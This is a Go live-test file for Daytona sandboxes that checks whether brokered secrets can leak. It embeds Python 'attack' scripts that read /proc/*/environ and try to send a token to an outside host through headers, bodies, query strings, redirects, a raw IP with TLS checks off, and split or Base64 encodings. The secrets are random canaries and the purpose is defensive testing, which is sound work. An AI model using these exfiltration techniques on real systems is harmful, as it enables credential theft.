@@ -1,0 +1,350 @@
+//go:build daytona_live
+
+package daytona
+
+import (
+	"context"
+	"crypto/rand"
+	"encoding/hex"
+	"encoding/json"
+	"errors"
+	"fmt"
+	"log/slog"
+	"os"
+	"strings"
+	"sync/atomic"
+	"testing"
+	"time"
+
+	sdk "github.com/daytona/clients/sdk-go/pkg/daytona"
+	sdkerrors "github.com/daytona/clients/sdk-go/pkg/errors"
+	"github.com/daytona/clients/sdk-go/pkg/types"
+	"github.com/stretchr/testify/require"
+	"github.com/stretchr/testify/suite"
+
+	"github.com/GetStream/Vision-Agents/acceleration/internal/connectors/core"
+	"github.com/GetStream/Vision-Agents/acceleration/internal/sandbox"
+)
+
+// LiveSuite runs the attacks of the wave's table that need Daytona's real egress, against
+// Daytona with DAYTONA_API_KEY: go test -tags daytona_live -run TestLiveSuite
+// ./internal/sandbox/daytona. Every secret holds a random canary, never a real token. Each
+// sandbox is labelled stream.env=live-test, stream.session=<prefix>_<session>, the names of its
+// secrets, and stream.run with this run, whose sandboxes the suite deletes once it ends, those
+// in Daytona's error state included.
+//
+// Daytona scrubs a secret's value out of every response back to its placeholder
+// (https://www.daytona.io/docs/en/secrets.md, «Response scrubbing»), so an echo shows the
+// placeholder whether or not it was substituted. The probe canary holds a ", which httpbin's
+// JSON echo writes as \", a text the scrubber does not match: seeing it is the proof a
+// placeholder was substituted. Without it, a «not substituted» check proves nothing and the
+// test says so.
+type LiveSuite struct {
+	suite.Suite
+	ctx    context.Context
+	client *sdk.Client
+	prefix string
+	// runID labels every sandbox of this run of the suite.
+	runID string
+	// probe is the canary the oracle reads; plain one a real token looks like.
+	probe, plain string
+	// revoked has both connections give sandbox.ErrNoCredential.
+	revoked atomic.Bool
+}
+
+func TestLiveSuite(t *testing.T) {
+	if os.Getenv(apiKeyEnvVar) == "" {
+		t.Skip("DAYTONA_API_KEY is not set")
+	}
+	suite.Run(t, new(LiveSuite))
+}
+
+func (s *LiveSuite) SetupSuite() {
+	s.runID = "live-" + random()
+}
+
+func (s *LiveSuite) TearDownSuite() {
+	sweepRun(s.T(), s.runID)
+}
+
+func (s *LiveSuite) SetupTest() {
+	s.ctx = context.Background()
+	client, err := sdk.NewClient()
+	s.Require().NoError(err)
+	s.client = client
+	s.prefix = "devlive_" + random()
+	s.probe, s.plain = `canary"`+random(), "canary"+random()
+	s.revoked.Store(false)
+}
+
+func random() string {
+	b := make([]byte, 6)
+	_, _ = rand.Read(b)
+	return hex.EncodeToString(b)
+}
+
+// runLabel is the label a live suite puts on each sandbox it makes, with its run as the value.
+const runLabel = "stream.run"
+
+// sweepRun deletes every sandbox labelled with run, whatever its state, and fails if one is
+// left. A Close deletes only the sandbox it holds, so one that Daytona put in its error state
+// while making it is found here alone. Daytona's list leaves out only an errored sandbox already
+// being deleted (api-client-go v0.211.2 api_sandbox.go:3800, includeErroredDeleted).
+func sweepRun(t require.TestingT, run string) {
+	client, err := sdk.NewClient()
+	require.NoError(t, err)
+	// Each delete waits up to 2 minutes, as TestADeletedSandboxIsMadeAgain's does; a run makes a
+	// handful of sandboxes.
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
+	defer cancel()
+	query := &sdk.ListSandboxesQuery{Labels: map[string]string{"stream.env": "live-test", runLabel: run}}
+	var made []*sdk.Sandbox
+	for box, err := range client.ListSeq(ctx, query) {
+		require.NoError(t, err)
+		made = append(made, box)
+	}
+	for _, box := range made {
+		// The query filters on the server, so a box that does not carry the labels is not ours to
+		// delete, as the router's sweeper checks too (cmd/router/sandboxes.go, ours).
+		if box.Labels[runLabel] != run || box.Labels["stream.env"] != "live-test" {
+			t.Errorf("sandbox %s came back for run %s with labels %v, left alone", box.ID, run, box.Labels)
+			continue
+		}
+		if box.State == "error" {
+			// DeleteAndWait fails on a sandbox in the error state (sdk-go v0.211.2 sandbox.go:685,
+			// :1264-1267), and Daytona leaves a deleted errored one in it: the final list proves it gone.
+			if err := box.Delete(ctx); err != nil && !errors.Is(err, sdkerrors.ErrNotFound) {
+				t.Errorf("could not delete sandbox %s of this run, in state %s: %v", box.ID, box.State, err)
+			}
+			continue
+		}
+		if err := box.DeleteAndWait(ctx, 2*time.Minute); err != nil && !errors.Is(err, sdkerrors.ErrNotFound) {
+			t.Errorf("could not delete sandbox %s of this run, in state %s: %v", box.ID, box.State, err)
+		}
+	}
+	for box, err := range client.ListSeq(ctx, query) {
+		require.NoError(t, err)
+		if box.State != "destroyed" {
+			t.Errorf("sandbox %s of this run is left, in state %s", box.ID, box.State)
+		}
+	}
+}
+
+// box is a sandbox of session that may send PROBE_TOKEN and PLAIN_TOKEN to httpbin.org, and
+// reach httpbingo.org as the host outside the grant.
+func (s *LiveSuite) box(session string) *Sandbox {
+	grant := func(binding, env string) sandbox.Grant {
+		return sandbox.Grant{Connection: core.ConnectionRef{CustomerID: "live", ConnectionID: binding}, Binding: binding,
+			Env: env, Hosts: []string{"httpbin.org"}}
+	}
+	broker, err := NewSecrets(SecretsOptions{Prefix: s.prefix, Session: session, Logger: slog.Default(),
+		Tokens: func(_ context.Context, g sandbox.Grant) (sandbox.Token, error) {
+			if s.revoked.Load() {
+				return sandbox.Token{}, sandbox.ErrNoCredential
+			}
+			if g.Binding == "probe" {
+				return sandbox.Token{Value: s.probe, Revision: 1}, nil
+			}
+			return sandbox.Token{Value: s.plain, Revision: 1}, nil
+		}})
+	s.Require().NoError(err)
+	box, err := New(Options{Config: sandbox.Config{AllowedDomains: []string{"httpbingo.org"}, TimeoutMs: 240_000},
+		Grants: []sandbox.Grant{grant("probe", "PROBE_TOKEN"), grant("plain", "PLAIN_TOKEN")}, Broker: broker,
+		Labels: map[string]string{"stream.env": "live-test", "stream.session": s.prefix + "_" + session, runLabel: s.runID}})
+	s.Require().NoError(err)
+	s.T().Cleanup(func() { _ = box.Close() })
+	return box
+}
+
+// attack is what code in the sandbox sees of each attack; other is a placeholder of another
+// sandbox, for A8 and A9.
+const attack = `
+import base64, glob, json, os, socket, ssl, time, urllib.error, urllib.parse, urllib.request
+P, Q, OTHER, PLAIN = os.environ["PROBE_TOKEN"], os.environ["PLAIN_TOKEN"], %q, %q
+def get(url, headers={}, data=None, context=None):
+    for attempt in range(4):
+        try:
+            return urllib.request.urlopen(urllib.request.Request(url, headers=headers, data=data), timeout=30, context=context).read().decode()
+        except urllib.error.HTTPError as e:
+            failed = "ERROR %%s: %%s" %% (e.code, e.read().decode(errors="replace")[:300])
+            if e.code not in (502, 503, 504) or "could not reach upstream host" in failed:
+                return failed
+            time.sleep(2 + 3 * attempt)
+        except Exception as e:
+            return "ERROR %%s: %%s" %% (type(e).__name__, e)
+    return failed
+environ = ""
+for f in glob.glob("/proc/*/environ"):
+    try:
+        environ += open(f, "rb").read().decode("latin1")
+    except Exception:
+        pass
+out = {"env": P + " " + Q, "environ": environ}
+out["oracle"] = get("https://httpbin.org/headers", {"X-Probe": P, "X-Plain": Q})
+out["a2"] = get("https://httpbingo.org/headers", {"X-Probe": P})
+out["a3"] = get("https://httpbin.org/anything", {"Content-Type": "text/plain"}, ("t=" + P).encode())
+out["a4"] = get("https://httpbin.org/anything?t=" + P)
+out["a6"] = get("https://httpbin.org/redirect-to?url=" + urllib.parse.quote("https://httpbingo.org/headers"), {"X-Probe": P})
+try:
+    ip = socket.gethostbyname("httpbin.org")
+    out["a11"] = get("https://" + ip + "/headers", {"Host": "httpbin.org", "X-Probe": P}, context=ssl._create_unverified_context())
+except Exception as e:
+    out["a11"] = "ERROR %%s: %%s" %% (type(e).__name__, e)
+out["a12"] = get("https://httpbin.org/headers", {"X-Probe": P[:12] + " " + P[12:], "X-Encoded": base64.b64encode(P.encode()).decode()})
+out["basic"] = get("https://httpbin.org/basic-auth/x-access-token/" + PLAIN, {"Authorization": "Basic " + base64.b64encode(("x-access-token:" + Q).encode()).decode()})
+out["c_httpbingo"] = get("https://httpbingo.org/headers")
+out["c_query"] = get("https://httpbin.org/anything?t=hello")
+out["c_fake"] = get("https://httpbin.org/headers", {"X-Probe": "dtn_secret_notarealone00"})
+if OTHER:
+    out["a8"] = get("https://httpbin.org/headers", {"X-Probe": OTHER})
+print(json.dumps(out))
+`
+
+// seen is what one run of attack saw.
+type seen map[string]string
+
+func (s *LiveSuite) run(box *Sandbox, other string) seen {
+	result, err := box.Run(s.ctx, fmt.Sprintf(attack, other, s.plain), nil)
+	s.Require().NoError(err)
+	s.Require().Zero(result.ExitCode, result.Output)
+	var out seen
+	s.Require().NoError(json.Unmarshal([]byte(result.Output), &out), result.Output)
+	return out
+}
+
+// substituted reports whether a response holds canary, as sent or as JSON escapes it.
+func substituted(response, canary string) bool {
+	return strings.Contains(response, canary) || strings.Contains(response, strings.ReplaceAll(canary, `"`, `\"`))
+}
+
+// blocked is Daytona's egress refusing a request: a 502 «could not reach upstream host», or
+// a 403 to the CONNECT of the HTTPS_PROXY it sets in the sandbox.
+func blocked(response string) bool {
+	return strings.HasPrefix(response, "ERROR 502: could not reach upstream host") ||
+		strings.Contains(response, "Tunnel connection failed: 403 Forbidden")
+}
+
+// unsubstituted checks that a request carrying sent went out without the probe canary: the
+// host saw sent as it was, or Daytona did not send it. It returns which.
+func (s *LiveSuite) unsubstituted(id, response, sent string) string {
+	s.False(substituted(response, s.probe), "%s: %s", id, response)
+	if blocked(response) {
+		return "blocked"
+	}
+	s.Contains(response, sent, "%s: %s", id, response)
+	return "unchanged"
+}
+
+func (s *LiveSuite) TestTheAttacksOnDaytonasEgress() {
+	first := s.box("live-a")
+	a := s.run(first, "")
+	for id, response := range a {
+		if id != "environ" {
+			s.T().Logf("%s: %s", id, response)
+		}
+	}
+	held, err := s.client.Get(s.ctx, first.box.ID)
+	s.Require().NoError(err)
+	s.Equal("live-test", held.Labels["stream.env"])
+	s.Equal(s.prefix+"_live-a", held.Labels["stream.session"])
+	placeholders := strings.Fields(a["env"])
+	s.Require().Len(placeholders, 2)
+	probe, plain := placeholders[0], placeholders[1]
+	results := map[string]string{}
+
+	// A1: code reads placeholders, never a canary, wherever it looks.
+	s.True(strings.HasPrefix(probe, "dtn_secret_"), probe)
+	s.True(strings.HasPrefix(plain, "dtn_secret_"), plain)
+	s.False(substituted(a["environ"], s.probe) || substituted(a["environ"], s.plain), "a canary in /proc/*/environ")
+
+	// The oracle and the controls: without them a «not substituted» or «blocked» proves
+	// nothing.
+	s.Require().True(substituted(a["oracle"], s.probe), "the probe canary is no longer seen substituted: %s", a["oracle"])
+	s.Require().Contains(a["c_httpbingo"], "headers", "httpbingo.org is reachable")
+	s.Require().Contains(a["c_query"], "hello", "a query to httpbin.org goes out")
+	results["control: an unknown dtn_secret_ in a header"] = s.unsubstituted("fake", a["c_fake"], "dtn_secret_notarealone00")
+
+	// A5: an echo of a real-looking token comes back as its placeholder.
+	s.Contains(a["oracle"], plain, "A5")
+	s.False(substituted(a["oracle"], s.plain), "A5")
+
+	for id, sent := range map[string]string{"A2": probe, "A3": probe, "A4": probe, "A6": probe, "A11": probe,
+		"A12": probe[:12] + " " + probe[12:]} {
+		results[id] = s.unsubstituted(id, a[strings.ToLower(id)], sent)
+	}
+
+	// Basic auth's password in Base64, the way git sends it, in a request of its own (Daytona
+	// refuses a request that also carries a placeholder it does not substitute). The response
+	// scrubs the canary back to the placeholder even inside the Base64, so an echo shows
+	// nothing; httpbin's basic-auth answers 200 only if the password reaching it is the canary.
+	// Daytona substitutes there (live staging E2E, 2026-10-22), and nothing else pins that.
+	s.Contains(a["basic"], `"authenticated": true`, "Basic: %s", a["basic"])
+
+	// A8: another sandbox's placeholder is not this sandbox's credential.
+	second := s.box("live-b")
+	b := s.run(second, probe)
+	s.T().Logf("b a8: %s", b["a8"])
+	s.Require().True(substituted(b["oracle"], s.probe), "the oracle reads the same in the second sandbox")
+	results["A8"] = s.unsubstituted("A8", b["a8"], probe)
+
+	// A9: once the session ends, Daytona keeps none of its secrets, and its placeholder is
+	// nothing.
+	s.Require().NoError(first.Close())
+	name := "va_" + s.prefix + "_live-a"
+	listed, err := s.client.Secret.List(s.ctx, &types.ListSecretsQuery{Name: &name})
+	s.Require().NoError(err)
+	s.Empty(listed.Items)
+	after := s.run(second, probe)
+	s.T().Logf("after a8: %s", after["a8"])
+	results["A9"] = s.unsubstituted("A9", after["a8"], probe)
+
+	s.Require().NoError(second.Close())
+	everything := "va_" + s.prefix
+	listed, err = s.client.Secret.List(s.ctx, &types.ListSecretsQuery{Name: &everything})
+	s.Require().NoError(err)
+	s.Empty(listed.Items)
+	s.T().Logf("results: %v", results)
+}
+
+// withdrawnAttack waits, up to 60 seconds, for httpbin.org to stop seeing the probe canary, and
+// says what a request with the placeholder got last. Daytona applies a secret's update within 15
+// seconds (https://www.daytona.io/docs/en/secrets.md); the rest is margin for a slow sandbox.
+const withdrawnAttack = `
+import json, os, time, urllib.error, urllib.request
+P = os.environ["PROBE_TOKEN"]
+def get(url):
+    try:
+        return urllib.request.urlopen(urllib.request.Request(url, headers={"Authorization": "Bearer " + P}), timeout=30).read().decode()
+    except urllib.error.HTTPError as e:
+        return "ERROR %s: %s" % (e.code, e.read().decode(errors="replace")[:300])
+    except Exception as e:
+        return "ERROR %s: %s" % (type(e).__name__, e)
+for attempt in range(13):
+    echo = get("https://httpbin.org/headers")
+    if "canary" not in echo:
+        break
+    time.sleep(5)
+print(json.dumps({"env": P, "echo": echo}))
+`
+
+// TestAWithdrawnCredentialReachesTheHostWithoutIt (AI-1876): once a run withdraws the probe's
+// credential, code still holds its placeholder, and a request with it reaches the host without
+// the credential, so the host answers it, rather than Daytona's egress answering 502 «could not
+// reach upstream host», which code cannot tell from the host failing.
+func (s *LiveSuite) TestAWithdrawnCredentialReachesTheHostWithoutIt() {
+	box := s.box("live-w")
+	before := s.run(box, "")
+	s.Require().True(substituted(before["oracle"], s.probe), "the probe canary is no longer seen substituted: %s", before["oracle"])
+	s.revoked.Store(true)
+
+	result, err := box.Run(s.ctx, withdrawnAttack, nil)
+	s.Require().NoError(err)
+	s.Require().Zero(result.ExitCode, result.Output)
+	var after seen
+	s.Require().NoError(json.Unmarshal([]byte(result.Output), &after), result.Output)
+	s.T().Logf("withdrawn: %v", after)
+
+	s.Equal(strings.Fields(before["env"])[0], after["env"], "the env var keeps its placeholder")
+	s.False(substituted(after["echo"], s.probe), after["echo"])
+	s.Contains(after["echo"], `"headers"`, "httpbin.org answers, not Daytona's egress")
+}
